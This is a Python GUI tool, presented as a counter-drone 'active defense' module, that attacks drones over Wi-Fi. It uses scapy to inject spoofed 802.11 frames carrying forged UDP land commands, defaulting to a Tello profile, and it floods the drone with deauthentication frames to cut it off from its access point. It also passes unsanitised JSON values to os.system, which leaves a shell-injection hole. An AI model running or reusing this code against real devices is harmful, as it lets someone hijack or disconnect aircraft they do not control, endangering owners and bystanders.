import customtkinter as ctk
import socket
import time
import json
import ipaddress
import threading
from scapy.all import RadioTap, Dot11, Dot11Deauth, LLC, SNAP, IP, UDP, sendp
import os

ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("green")

# GUI background
app = ctk.CTk()
app.title("Drone Deauth Active Response Module")
app.geometry("600x400")


def load_drone_json(filepath='drones.json'):
    try:
        with open(filepath,'r') as file:
            return json.load(file)
    # Check if the json config file is here. 
    # It records the Drone's profile data.
    # The details of the json content are in the readme file under "Drone-Deauth-Detect-And-Response-System" folder.  
    except FileNotFoundError:
        status_label.configure(text=f'No json config file found.')
        return{}
    except json.JSONDecodeError:
        status_label.configure(text=f'Wrong file format. It should be json file')
        return{}


def active_response_land(drone_model=None, custom_ip=None):
    profiles = load_drone_json()
    if "Error" in profiles:
        status_label.configure(text=f"Error: {profiles['Error']}", text_color="red")
        return
    if drone_model not in profiles:
        status_label.configure(text="Error: Cannot find drone_model in json.", text_color="red")
        return

    profile = profiles[drone_model]
    
    target_mac = profile.get("mac_address")
    if not target_mac:
        status_label.configure(text="Error: Missing mac_address in JSON. Aborting.", text_color="red")
        return
    
    # Broadcast is prohibited in this system
    if target_mac.upper()=="FF:FF:FF:FF:FF:FF":
        status_label.configure(text="Broadcast is prohibited in this system",text_color="red")
        return
    
    iface = profile.get("interface", "wlan0")
    target_ip = custom_ip if custom_ip else profile.get("default_ip", "1.2.3.4")
    target_port = profile.get("port", 1234)

    fake_client_mac = "00:AB:CD:EF:FF:FF" 
    fake_client_ip = "192.168.10.2"

    status_label.configure(text=f"\n Will send active defense land command")

    def send_scapy_cmd(cmd_str):
        dot11 = Dot11(type=2, subtype=0, FCfield=1, addr1=target_mac, addr2=fake_client_mac, addr3=target_mac)
    
        pkt = RadioTap() / dot11 / LLC() / SNAP() / IP(src=fake_client_ip, dst=target_ip) / UDP(sport=8889, dport=target_port) / cmd_str.encode('utf-8')
        
        sendp(pkt, iface=iface, verbose=False)


    try:
        if profile.get("initial_cmd"):
            status_label.configure(text="send initial command")
            send_scapy_cmd(profile["initial_cmd"])
            time.sleep(0.5)

        if profile.get("land_cmd"):
            status_label.configure(text="Send land command now")
            send_scapy_cmd(profile["land_cmd"])
            status_label.configure(text="Land command sent successfully")
        
        else:
             status_label.configure(text="Json config file has no land commond")
    except Exception as e:
         status_label.configure(text=f"Unsuccess : {e}")


def btn_trigger_land():

    selected_drone = drone_combo.get()
    final_ip = None 
    threading.Thread(target=active_response_land, args=(selected_drone, final_ip), daemon=True).start()

def counter_deauth():
    drone_model = drone_combo.get()
    profiles = load_drone_json()
    if not profiles or drone_model not in profiles:
        status_label.configure(text="Error: Drone profile not found", text_color="red")        
        return
    profile = profiles[drone_model]    
    target_mac = profile.get("mac_address")
    gateway_mac = profile.get("ap_mac")
    iface = profile.get("interface", "wlan0")    
    channel = profile.get("channel", "1")

    if not target_mac or not gateway_mac:        
        status_label.configure(text="Error: MAC missing in JSON", text_color="red")
        return
    status_label.configure(text=f"INITIATING DEAUTH DEFENSE...", text_color="orange")

    try:
        os.system(f"iwconfig {iface} channel {channel}")
        pkt = RadioTap() / Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac) / Dot11Deauth(reason=3)
        sendp(pkt, iface=iface, count=40, inter=0.2, verbose=False)
        status_label.configure(text="Deauth Sequence Completed", text_color="green")

    except Exception as e:
        status_label.configure(text=f"Deauth Failed: {e}", text_color="red")



def btn_trigger_counter():
    threading.Thread(target=counter_deauth, daemon=True).start()

title_label = ctk.CTkLabel(app, text="Active Defense Response System", font=("Arial", 24, "bold"))
title_label.pack(pady=(20, 10))

status_label = ctk.CTkLabel(app, text="Status: Standby", text_color="white", font=("Arial", 16))
status_label.pack(pady=(0, 20))

drone_data = load_drone_json()
drone_list = list(drone_data.keys()) if (drone_data is not None and "Error" not in drone_data) else ["DRONE 1"]

drone_combo = ctk.CTkComboBox(app, values=drone_list, width=200)
drone_combo.pack(pady=10)
if drone_list:
    if "Tello" in drone_list:
        drone_combo.set("Tello")
    else:    
        drone_combo.set(drone_list[0])


land_btn = ctk.CTkButton(app, text="EMERGENCY LAND", fg_color="red", hover_color="darkred", 
                         font=("Arial", 20, "bold"), height=50, command=btn_trigger_land)
land_btn.pack(pady=30)
counter_btn = ctk.CTkButton(app, text="Counter Deauth!", 
                            fg_color="orange", hover_color="darkorange", 
                            font=("Arial", 16, "bold"), height=40, command=btn_trigger_counter)
counter_btn.pack(pady=10)
app.mainloop()